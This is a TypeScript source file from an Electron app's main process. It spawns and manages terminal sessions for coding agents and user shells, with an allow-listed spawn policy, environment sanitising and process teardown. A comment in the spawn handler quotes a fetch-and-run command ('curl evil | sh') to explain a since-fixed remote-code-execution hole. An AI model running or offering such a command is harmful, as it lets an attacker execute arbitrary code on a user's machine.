import { app, type IpcMain, type BrowserWindow } from "electron";
import log from "electron-log/main";
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { getAppTheme } from "./app-theme";
import { installAgentHooks } from "./agent-hooks";
import { installAgentMemoryBrief } from "./agent-memory-brief";
import { ensureStatuslineTap } from "../src/shared/statusline-tap";
import { ensureDiagramSkillForAgent } from "./ensure-diagram-skill";
import { ensureRecallSkillForAgent, removeRecallSkillForAgent } from "./ensure-recall-skill";
import { ensureRecallMcpForAgent, removeRecallMcpForAgent } from "./ensure-recall-mcp";
import { fetchRecallEnabled } from "./recall-enabled";
import { IPC } from "./ipc-channels";
import { safeHandle } from "./ipc-safe-handle";
import { PtyOutputBatcher } from "./pty-output-batch";
import { resolveAgentCommandOnPath } from "./agent-cli-resolution";
import {
  resolveShell,
  sanitizedProcessEnv,
  shellArgsForCommand,
} from "./shell-env";
import { loadProjectRoots } from "./project-roots";
import { MAX_TCP_PORT } from "../src/shared/tcp-port";
import { shortId } from "../src/shared/short-id";
import {
  resolveSpawnPlan,
  SpawnPolicyError,
  type SpawnRequest,
} from "./pty-spawn-policy";
import { buildSyntheticHookUrl, type PtyHookEnv } from "./pty-hook-env";
import { checkAgentCliVersionCached, agentVersionErrorMessage } from "./agent-cli-version";
import { AGENT_CLI_CONFIG } from "./agent-cli-version-requirements";
import { applyAgentPtyEnv } from "../src/shared/agent-pty-env";

function sanitizeEnv(): Record<string, string> {
  const out = sanitizedProcessEnv();
  // The PTY is xterm.js, not whichever terminal launched Electron. Leaking
  // TERM_PROGRAM=ghostty (or iTerm.app, etc.) makes Claude Code take terminal-
  // specific code paths that don't match what we actually emit — e.g. it skips
  // installing the Shift+Enter keybinding when it thinks Ghostty is handling it
  // natively, but xterm.js sends `\x1b\r` (the iTerm sequence) instead of LF.
  delete out.TERM_PROGRAM;
  delete out.TERM_PROGRAM_VERSION;
  delete out.MC_API_URL;
  delete out.MC_API_TOKEN;
  return out;
}

// Claude Code only treats ESC+CR (`\x1b\r`, what `terminal-keymap.ts` emits for
// Shift+Enter) as "insert newline" when this flag is set. Normally `/terminal-
// setup` writes it; do it eagerly so the user doesn't have to.
function ensureClaudeShiftEnterBinding(): void {
  try {
    const dir = path.join(os.homedir(), ".claude");
    const file = path.join(dir, "settings.json");
    let settings: Record<string, unknown> = {};
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, "utf8");
      if (raw.trim()) settings = JSON.parse(raw);
    }
    if (settings.shiftEnterKeyBindingInstalled === true) return;
    settings.shiftEnterKeyBindingInstalled = true;
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(file, JSON.stringify(settings, null, 2) + "\n", "utf8");
  } catch {
    // best-effort — user can still run `/terminal-setup` manually.
  }
}

type Pty = {
  id: string;
  taskId: string;
  proc: any;
  buffer: PtyBufferChunk[];
  bufferBytes: number;
  nextSeq: number;
  cwd: string;
  command: string;
  agent?: string;
  /** True for user-shell terminals; findByTask only matches agent PTYs. */
  shell: boolean;
  mcEnv?: PtyHookEnv;
  scanTail: string;
  lastInterruptAt: number;
  /** Last renderer write (user keystroke) — marks the PTY as interactive so
   *  battery saver never throttles typing echo (see pty-output-batch.ts). */
  lastInputAt: number;
};

type PtyBufferChunk = {
  seq: number;
  data: string;
  bytes: number;
};

const INTERRUPT_COOLDOWN_MS = 2000;
const SCAN_TAIL_MAX = 256;
/** How long after a keystroke a PTY still counts as interactive. */
const PTY_INTERACTIVE_WINDOW_MS = 10_000;

const LSOF_PROBE_TIMEOUT_MS = 2_000;
// Time we'll wait for SIGTERM to take before escalating to SIGKILL (port-kill)
// or before giving up the wait (pty kill). Same grace for both: 1.5s.
const SIGTERM_GRACE_MS = 1_500;
const PORT_KILL_POLL_INTERVAL_MS = 100;
const PTY_EXIT_POLL_INTERVAL_MS = 50;
const TASKKILL_TIMEOUT_MS = 5_000;
const LOG_VALUE_MAX_LENGTH = 160;

function safeLogValue(value: unknown): unknown {
  if (typeof value !== "string") return value;
  const cleaned = value.replace(/[\x00-\x1f\x7f]/g, "?");
  return cleaned.length > LOG_VALUE_MAX_LENGTH
    ? `${cleaned.slice(0, LOG_VALUE_MAX_LENGTH)}...`
    : cleaned;
}
const DEFAULT_PTY_COLS = 100;
const DEFAULT_PTY_ROWS = 30;

export function hasClaudeInterruptPrompt(text: string): boolean {
  return (
    text.includes("Interrupted by user") ||
    (text.includes("Interrupted") &&
      text.includes("What should Claude do instead"))
  );
}

export function hasCodexHookReviewPrompt(text: string): boolean {
  const normalized = text.replace(/\s+/g, " ").toLowerCase();
  return (
    normalized.includes("hooks need review before they can run") ||
    normalized.includes("open /hooks to review")
  );
}

function scanTail(p: Pty, chunk: string): string {
  const haystack = (p.scanTail + chunk).slice(-SCAN_TAIL_MAX - chunk.length);
  p.scanTail = haystack.slice(-SCAN_TAIL_MAX);
  return haystack;
}

function scanForInterrupt(p: Pty, haystack: string) {
  if (p.agent !== "claude-code") return;
  if (!p.mcEnv?.apiUrl || !p.mcEnv?.token) return;
  if (!hasClaudeInterruptPrompt(haystack)) return;
  const now = Date.now();
  if (now - p.lastInterruptAt < INTERRUPT_COOLDOWN_MS) return;
  p.lastInterruptAt = now;
  void postSyntheticHook(p, "UserInterrupt");
}

function scanForCodexHookReview(p: Pty, haystack: string) {
  if (p.agent !== "codex") return;
  if (!p.mcEnv?.apiUrl || !p.mcEnv?.token) return;
  if (!hasCodexHookReviewPrompt(haystack)) return;
  void postSyntheticHook(p, "PermissionRequest");
}

async function postSyntheticHook(p: Pty, event: string) {
  try {
    const url = buildSyntheticHookUrl(p.mcEnv!, p.agent, p.taskId);
    if (!url) return;
    await fetch(url, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${p.mcEnv!.token}`,
      },
      body: JSON.stringify({ hook_event_name: event }),
    });
  } catch {
    /* swallow — best-effort status sync */
  }
}

const ptys = new Map<string, Pty>();
const RING_LIMIT_BYTES = 1_000_000;

type PortKillResult = {
  port: number;
  pids: number[];
  killed: number[];
  errors: string[];
};

type LaunchPortKillTarget = {
  port: number;
  protected: boolean;
};

let nodePty: typeof import("node-pty") | null = null;
function loadNodePty() {
  if (!nodePty) {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    nodePty = require("node-pty");
  }
  return nodePty!;
}

function appendBuffer(p: Pty, data: string): number {
  const bytes = Buffer.byteLength(data, "utf8");
  const seq = p.nextSeq++;
  p.buffer.push({ seq, data, bytes });
  p.bufferBytes += bytes;
  while (p.bufferBytes > RING_LIMIT_BYTES && p.buffer.length > 1) {
    const dropped = p.buffer.shift()!;
    p.bufferBytes -= dropped.bytes;
  }
  return seq;
}

// A voice-seeded starting prompt is written to the agent's stdin like the user
// typing. Drop C0/DEL control bytes so a mis-transcription can't drive TUI
// keybindings; the submit CR is added separately by the caller.
function sanitizeInitialInput(text: string | undefined): string | undefined {
  if (!text) return undefined;
  const clean = Array.from(text)
    .filter((ch) => {
      const code = ch.charCodeAt(0);
      return code >= 32 && code !== 127;
    })
    .join("")
    .trim();
  return clean || undefined;
}

function send(getWin: () => BrowserWindow | null, channel: string, payload: any) {
  const win = getWin();
  if (!win || win.isDestroyed()) return;
  win.webContents.send(channel, payload);
}

function normalizedCommand(command: string): string {
  return command.trim();
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * True when `cwd` is `root` or a path nested inside it. Used to find every PTY
 * whose working directory lives under a worktree that's about to be deleted.
 * Case-insensitive on Windows because a PTY's resolved cwd and the worktree
 * path the renderer sends can differ in drive-letter / segment casing.
 */
export function isCwdWithin(cwd: string, root: string): boolean {
  if (!cwd || !root) return false;
  const norm = (p: string) => {
    const resolved = path.resolve(p);
    return os.platform() === "win32" ? resolved.toLowerCase() : resolved;
  };
  const rel = path.relative(norm(root), norm(cwd));
  return rel === "" || (!rel.startsWith("..") && !path.isAbsolute(rel));
}

/**
 * node-pty's `proc.kill()` only signals the immediate shell. On Windows that
 * leaves grandchild processes alive — notably the `node.exe` running Claude
 * Code, which keeps a handle on the worktree's `.claude/` dir and blocks the
 * delete with "Permission denied". taskkill /T tears down the whole tree so the
 * handles are released before we try to remove the worktree.
 */
function killProcessTreeWindows(pid: number | undefined): void {
  if (os.platform() !== "win32" || !pid || pid <= 0) return;
  try {
    spawnSync("taskkill", ["/pid", String(pid), "/t", "/f"], {
      timeout: TASKKILL_TIMEOUT_MS,
    });
  } catch {
    /* best-effort — proc.kill() below is the fallback */
  }
}

/**
 * Fully release a PTY, including the master /dev/ptmx fd that node-pty holds in
 * THIS (main Electron) process.
 *
 * node-pty's `proc.kill()` only sends SIGHUP to the immediate child — it never
 * closes the master fd. If that child survives the signal (a claude/codex agent
 * that re-parented its tool subprocesses, a shell trapping SIGHUP, a stopped
 * job), the slave stays open, the master never sees EIO, and node-pty keeps the
 * master fd open for the life of the app. Every leaked master counts against
 * macOS's system-wide `kern.tty.ptmx_max` (~511), so a long-lived window that
 * churns PTYs (e.g. the warm-session pool re-preparing on every project query
 * refetch) eventually exhausts the cap and makes EVERY pty spawn on the whole
 * machine fail with posix_spawnp/ENXIO.
 *
 * node-pty's `destroy()` is the only method that closes the master socket
 * directly; hanging up the master also makes the kernel SIGHUP the slave's
 * foreground process group, so the fd is reclaimed even when the child won't die
 * on its own. It isn't on the public `IPty` type but exists on both the Unix and
 * Windows terminals at runtime — fall back to `kill()` if a future version drops
 * it. This is the single teardown path; never call `proc.kill()` directly.
 */
export function disposePty(proc: import("node-pty").IPty | null | undefined): void {
  if (!proc) return;
  // Windows: SIGHUP doesn't reach the grandchild node.exe that holds the
  // worktree's .claude/ handle; tear down the whole tree first.
  killProcessTreeWindows(proc.pid);
  const closable = proc as unknown as { destroy?: () => void };
  try {
    if (typeof closable.destroy === "function") {
      closable.destroy();
    } else {
      proc.kill();
    }
  } catch {
    /* already exited or fd already closed */
  }
}

function pidsListeningOnPort(port: number): number[] {
  if (!Number.isInteger(port) || port <= 0 || port > MAX_TCP_PORT) return [];
  if (os.platform() === "win32") return [];

  const result = spawnSync("lsof", ["-nP", `-tiTCP:${port}`, "-sTCP:LISTEN"], {
    encoding: "utf8",
    timeout: LSOF_PROBE_TIMEOUT_MS,
  });
  if (result.error || result.status !== 0) return [];

  const pids = (result.stdout || "")
    .split(/\s+/)
    .map((raw) => Number(raw))
    .filter((pid) => Number.isInteger(pid) && pid > 0 && pid !== process.pid);
  return [...new Set(pids)];
}

async function killPidsListeningOnPort(port: number): Promise<PortKillResult> {
  const pids = pidsListeningOnPort(port);
  const killed: number[] = [];
  const errors: string[] = [];

  for (const pid of pids) {
    try {
      process.kill(pid, "SIGTERM");
      killed.push(pid);
    } catch (err: any) {
      errors.push(`pid ${pid}: ${err?.message ?? String(err)}`);
    }
  }

  if (killed.length > 0) {
    const deadline = Date.now() + SIGTERM_GRACE_MS;
    while (Date.now() < deadline && pidsListeningOnPort(port).some((pid) => killed.includes(pid))) {
      await sleep(PORT_KILL_POLL_INTERVAL_MS);
    }
    for (const pid of pidsListeningOnPort(port).filter((pid) => killed.includes(pid))) {
      try {
        process.kill(pid, "SIGKILL");
      } catch {
        /* already exited or not permitted */
      }
    }
  }

  return { port, pids, killed, errors };
}

function normalizePorts(ports: Iterable<number | null | undefined>): number[] {
  return [
    ...new Set(
      [...ports].filter(
        (port): port is number =>
          typeof port === "number" &&
          Number.isInteger(port) &&
          port > 0 &&
          port <= MAX_TCP_PORT
      )
    ),
  ];
}

export function planLaunchPortKillTargets(
  ports: Iterable<number | null | undefined>,
  protectedPorts: Iterable<number | null | undefined>,
): LaunchPortKillTarget[] {
  const protectedSet = new Set(normalizePorts(protectedPorts));
  return normalizePorts(ports).map((port) => ({
    port,
    protected: protectedSet.has(port),
  }));
}

async function killPty(p: Pty): Promise<boolean> {
  let exited = false;
  try {
    const sub = p.proc.onExit(() => {
      exited = true;
    });
    disposePty(p.proc);
    const deadline = Date.now() + SIGTERM_GRACE_MS;
    while (!exited && Date.now() < deadline) {
      await sleep(PTY_EXIT_POLL_INTERVAL_MS);
    }
    sub?.dispose?.();
    return true;
  } catch {
    return false;
  } finally {
    ptys.delete(p.id);
  }
}

/**
 * Kill every live PTY whose working directory is inside `root`, awaiting their
 * exit. Called before a worktree is deleted so no terminal, agent, or launch
 * process keeps a handle that would block removal on Windows. Returns how many
 * PTYs were terminated.
 */
async function killPtysUnderPath(root: string): Promise<number> {
  const targets = [...ptys.values()].filter((p) => isCwdWithin(p.cwd, root));
  await Promise.all(targets.map((p) => killPty(p)));
  return targets.length;
}

export function registerPtyHandlers(
  ipcMain: IpcMain,
  getWin: () => BrowserWindow | null,
  getHookEnv: () => PtyHookEnv | null,
  getProtectedPorts: () => Iterable<number | null | undefined> = () => [],
) {
  ensureClaudeShiftEnterBinding();
  // The interrupt/hook scans run on the coalesced batch: the rolling scan tail
  // sees the same byte stream it did per-chunk, detection latency is at most
  // one flush interval.
  const outputBatcher = new PtyOutputBatcher((ptyId, data, seq) => {
    const p = ptys.get(ptyId);
    if (p) {
      const haystack = scanTail(p, data);
      scanForInterrupt(p, haystack);
      scanForCodexHookReview(p, haystack);
    }
    send(getWin, IPC.ptyData, { ptyId, data, seq });
  });
  safeHandle(
    IPC.ptySpawn,
    async (_evt, opts: SpawnRequest) => {
      const pty = loadNodePty();
      const platform = os.platform();

      // Validate cwd, agent allow-list, and command shape BEFORE spawning. The
      // pre-fix handler joined `command + args` into a shell string and handed
      // it to `sh -l -c`, which made `pty:spawn` a direct RCE primitive — a
      // briefly-compromised renderer could pass `curl evil | sh` as `command`
      // and get full local execution. The policy module rejects anything that
      // isn't an allow-listed agent binary spawned with a clean argv array, or
      // an explicitly opted-in user-shell terminal confined to a project root.
      // Project-less "home" shell terminals (dashboard terminals) resolve to the
      // host's home dir HERE — the renderer never supplies it — and the policy is
      // told to allow that dir for shell spawns only (see homeShellRoots).
      const spawnReq: SpawnRequest =
        opts.shell === true && opts.home
          ? ({ ...opts, cwd: os.homedir() } as SpawnRequest)
          : opts;
      let plan: ReturnType<typeof resolveSpawnPlan>;
      try {
        plan = resolveSpawnPlan(spawnReq, {
          projectRoots: loadProjectRoots,
          homeShellRoots: () => [os.homedir()],
          resolveCommand: (name) => resolveAgentCommandOnPath(name, sanitizedProcessEnv()),
          resolveShell: () => ({
            shell: resolveShell(),
            shellArgs: (cmd) => shellArgsForCommand(resolveShell(), cmd, platform),
          }),
        });
      } catch (err) {
        if (err instanceof SpawnPolicyError) {
          // User-reportable failures end up as a single line in `term.writeln`
          // on the renderer; a main-side log keeps the rejection code, the
          // requesting agent, and the cwd available when a user files a "spawn
          // failed" report, without echoing the agent's argv (which may carry
          // session ids the user wouldn't want in a paste).
          log.warn("pty.spawn.rejected", {
            code: err.code,
            agent: safeLogValue(opts.agent ?? null),
            shell: opts.shell === true,
            cwd: safeLogValue(opts.cwd),
            taskId: safeLogValue(opts.taskId),
          });
          throw new Error(`pty:spawn rejected (${err.code})`);
        }
        throw err;
      }

      const env = sanitizeEnv();
      if (plan.mode === "agent") {
        const requirement = AGENT_CLI_CONFIG[plan.agent];
        const versionCheck = checkAgentCliVersionCached(plan.binary, env, requirement, platform);
        if (!versionCheck.ok) {
          const message = agentVersionErrorMessage(versionCheck);
          throw new Error(message);
        }
      }

      // Use the canonical cwd from the plan, not the original request, so a
      // symlink-swap race between validation and spawn can't move us into a
      // post-validation target outside the project root.
      installAgentHooks(opts.agent, plan.cwd);
      const mcEnv = plan.mode === "agent" ? getHookEnv() : null;
      if (plan.mode === "agent") {
        ensureDiagramSkillForAgent(app.getAppPath(), plan.cwd, plan.agent);
        // Recall provisioning follows the LIVE master switch so flipping the
        // toggle applies to the next session without an app restart. Off →
        // actively remove the managed skill + `.mcp.json` entry; on (or
        // unknown — the fetch is fail-soft) → install as before. A running
        // session can't hot-swap its MCP config, but the server also refuses
        // Recall reads while disabled, so its tools go dead regardless.
        const recallEnabled = await fetchRecallEnabled(mcEnv);
        if (recallEnabled === false) {
          removeRecallSkillForAgent(plan.cwd, plan.agent);
          removeRecallMcpForAgent(plan.cwd, plan.agent);
        } else {
          ensureRecallSkillForAgent(app.getAppPath(), plan.cwd, plan.agent);
          // Recall code graph — file-based MCP config for local Claude sessions
          // only (self-gated inside). Never touches the spawn argv.
          ensureRecallMcpForAgent(app.getAppPath(), plan.cwd, plan.agent);
        }
        // Claude sessions feed the shared usage-limits cache via the statusline
        // tap, so the top-bar indicator doesn't have to poll Anthropic's
        // aggressively rate-limited OAuth usage endpoint.
        if (plan.agent === "claude-code") ensureStatuslineTap(plan.cwd);
      }

      // Theme hint for the agent: prefer main's authoritative app theme over
      // the renderer-supplied value — the renderer reads its OWN window's
      // data-theme, and a spawn initiated from a stale window (focus window,
      // floating pane) used to bake the old theme into the new session's env.
      const appTheme =
        getAppTheme() ?? (opts.missionControlTheme === "light" ? "light" : "dark");
      env.MC_TASK_ID = opts.taskId;
      if (mcEnv) {
        env.MC_API_URL = mcEnv.apiUrl;
        env.MC_API_TOKEN = mcEnv.token;
        env.MC_THEME = appTheme;
      }
      // Mirror Mission Control's light/dark to the agent's own UI. COLORFGBG is
      // the terminal-background hint Claude Code (and other COLORFGBG-aware TUIs)
      // read to auto-pick a theme: the trailing number is the background color
      // index — 15 (white) reads as light, 0 (black) as dark. This only takes
      // effect when the agent's own theme is set to "auto"; an explicit
      // light/dark in the agent's config wins. Overrides any COLORFGBG inherited
      // from the launching shell so the session matches the app, not the host.
      if (plan.mode === "agent") {
        env.COLORFGBG = appTheme === "light" ? "0;15" : "15;0";
      }
      applyAgentPtyEnv(env, opts.agent);

      // Recall — inject the project's Session Brief into the agent's auto-load
      // file BEFORE spawning so the agent reads current project memory on
      // startup. Fetches the rendered brief from the local API server; fully
      // fail-soft (short timeout, never throws) so it can't block the session.
      if (plan.mode === "agent") {
        await installAgentMemoryBrief({
          agent: opts.agent,
          cwd: plan.cwd,
          taskId: opts.taskId,
          mcEnv,
        });
      }

      // Agent mode uses the policy-built spawn target. POSIX/native executables
      // still launch directly; Windows npm .cmd/.bat shims go through cmd.exe
      // only after the agent argv has been allow-listed and tokenized.
      const spawnTarget = plan.mode === "agent" ? plan.spawnTarget : plan.shellPath;
      const spawnArgs = plan.mode === "agent" ? plan.spawnArgs : plan.shellArgs;

      let proc: import("node-pty").IPty;
      try {
        proc = pty.spawn(spawnTarget, spawnArgs, {
          name: "xterm-256color",
          cols: opts.cols ?? DEFAULT_PTY_COLS,
          rows: opts.rows ?? DEFAULT_PTY_ROWS,
          cwd: plan.cwd,
          env,
        });
      } catch (err: any) {
        const msg = err?.message ?? String(err);
        if (msg.includes("posix_spawnp")) {
          throw new Error(
            `posix_spawnp failed for target="${spawnTarget}" cwd="${plan.cwd}". ` +
              `Verify the binary exists and the cwd is a readable directory. ` +
              `Original: ${msg}`
          );
        }
        throw err;
      }

      const id = shortId("pty");
      const p: Pty = {
        id,
        taskId: opts.taskId,
        proc,
        buffer: [],
        bufferBytes: 0,
        nextSeq: 1,
        cwd: opts.cwd,
        command: opts.command,
        agent: opts.agent,
        shell: opts.shell === true,
        mcEnv: mcEnv ?? undefined,
        scanTail: "",
        lastInterruptAt: 0,
        lastInputAt: 0,
      };
      ptys.set(id, p);

      // Voice control can seed a fresh agent session with a starting prompt.
      // The agent's TUI isn't ready for input the instant it spawns, so we wait
      // for its first output plus a short settle before writing — otherwise the
      // text is dropped during startup. Fires exactly once; the trailing CR is
      // delayed slightly so the TUI registers the text before it submits.
      const INITIAL_INPUT_SETTLE_MS = 450;
      const INITIAL_INPUT_SUBMIT_DELAY_MS = 150;
      // Fallback so the prompt still lands if the agent TUI emits no output before
      // we'd otherwise wait on its first data chunk.
      const INITIAL_INPUT_MAX_WAIT_MS = 4000;
      // Strip control bytes so a mis-transcription can't drive TUI keybindings; the
      // single submit CR is added separately below.
      const initialInput =
        plan.mode === "agent" && !opts.shell
          ? sanitizeInitialInput(opts.initialInput)
          : undefined;
      let initialInputScheduled = false;
      let initialInputTimer: ReturnType<typeof setTimeout> | undefined;
      const scheduleInitialInput = (delayMs: number) => {
        if (initialInputScheduled) return;
        initialInputScheduled = true;
        initialInputTimer = setTimeout(sendInitialInput, delayMs);
      };
      const sendInitialInput = () => {
        if (!initialInput) return;
        try {
          proc.write(initialInput);
          setTimeout(() => {
            try {
              proc.write("\r");
            } catch {
              /* pty already exited */
            }
          }, INITIAL_INPUT_SUBMIT_DELAY_MS);
        } catch {
          /* pty already exited before the starting prompt could be written */
        }
      };

      proc.onData((data: string) => {
        const seq = appendBuffer(p, data);
        outputBatcher.push(id, seq, data, Date.now() - p.lastInputAt < PTY_INTERACTIVE_WINDOW_MS);
        if (initialInput) scheduleInitialInput(INITIAL_INPUT_SETTLE_MS);
      });
      // Fallback so the prompt still lands even if the agent emits no output.
      const initialInputFallback = initialInput
        ? setTimeout(() => scheduleInitialInput(0), INITIAL_INPUT_MAX_WAIT_MS)
        : undefined;
      proc.onExit(({ exitCode, signal }: { exitCode: number; signal?: number }) => {
        if (initialInputTimer) clearTimeout(initialInputTimer);
        if (initialInputFallback) clearTimeout(initialInputFallback);
        // Final output must land before the exit event or it's lost.
        outputBatcher.flush(id);
        send(getWin, IPC.ptyExit, { ptyId: id, exitCode, signal });
        ptys.delete(id);
      });

      return { ptyId: id };
    },
    ipcMain,
  );

  safeHandle(IPC.ptyWrite, (_evt, { ptyId, data }: { ptyId: string; data: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return false;
    p.lastInputAt = Date.now();
    p.proc.write(data);
    return true;
  }, ipcMain);

  safeHandle(
    IPC.ptyResize,
    (_evt, { ptyId, cols, rows }: { ptyId: string; cols: number; rows: number }) => {
      const p = ptys.get(ptyId);
      if (!p) return false;
      try {
        p.proc.resize(cols, rows);
      } catch {
        /* swallow */
      }
      return true;
    },
    ipcMain,
  );

  safeHandle(IPC.ptyKill, (_evt, { ptyId }: { ptyId: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return false;
    disposePty(p.proc);
    ptys.delete(ptyId);
    return true;
  }, ipcMain);

  safeHandle(
    IPC.ptyKillLaunchProcesses,
    async (
      _evt,
      opts: { cwd: string; commands: string[]; ports?: number[] }
    ): Promise<{ ptyCount: number; ports: PortKillResult[] }> => {
      const wanted = new Set((opts.commands ?? []).map(normalizedCommand).filter(Boolean));
      const targets = [...ptys.values()].filter(
        (p) => p.cwd === opts.cwd && wanted.has(normalizedCommand(p.command))
      );
      await Promise.all(targets.map((p) => killPty(p)));

      const ports = planLaunchPortKillTargets(opts.ports ?? [], getProtectedPorts());
      const portResults = await Promise.all(
        ports.map((target) =>
          target.protected
            ? {
                port: target.port,
                pids: [],
                killed: [],
                errors: ["skipped protected Mission Control runtime port"],
              }
            : killPidsListeningOnPort(target.port)
        )
      );
      return { ptyCount: targets.length, ports: portResults };
    },
    ipcMain,
  );

  safeHandle(
    IPC.ptyKillUnderPath,
    async (_evt, { cwd }: { cwd: string }): Promise<{ ptyCount: number }> => {
      const ptyCount = await killPtysUnderPath(cwd);
      return { ptyCount };
    },
    ipcMain,
  );

  // Live agent PTY for a task, if any. Local pty ids are not persisted across
  // renderer reloads, but the processes themselves survive in this map — the
  // renderer asks here before spawning so a reload reattaches to the running
  // agent instead of launching a duplicate (which dies with "session ID is
  // already in use" for agents that pin a session id).
  safeHandle(IPC.ptyFindByTask, (_evt, { taskId }: { taskId: string }) => {
    if (typeof taskId !== "string" || !taskId) return { ptyId: null };
    let found: string | null = null;
    for (const p of ptys.values()) {
      if (p.taskId === taskId && !p.shell) found = p.id;
    }
    return { ptyId: found };
  }, ipcMain);

  safeHandle(IPC.ptyReplay, (_evt, { ptyId }: { ptyId: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return { data: "", nextSeq: 0 };
    // Deliver pending output as a pre-snapshot message first, so no later
    // batch ever mixes chunks from both sides of this snapshot (see the
    // invariant note in pty-output-batch.ts).
    outputBatcher.flush(ptyId);
    return {
      data: p.buffer.map((chunk) => chunk.data).join(""),
      nextSeq: p.nextSeq,
    };
  }, ipcMain);
}

export function killAllPtys() {
  for (const p of ptys.values()) {
    disposePty(p.proc);
  }
  ptys.clear();
}
